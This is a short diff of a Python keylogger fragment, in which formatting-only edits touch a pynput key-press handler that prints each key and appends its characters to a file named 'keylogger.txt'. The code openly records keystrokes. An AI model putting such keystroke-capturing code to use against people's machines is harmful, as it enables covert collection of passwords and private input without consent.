@@ -1,8 +1,8 @@
 from pynput import keyboard
 
-def keyPressed(key):
+def keyPressed(key) :
     print(str(key))
-    with open("keylogger.txt", "a") as f:
+    with open("keylogger.txt", "a") as f :
         try:
             char = key.char
             f.write(char)
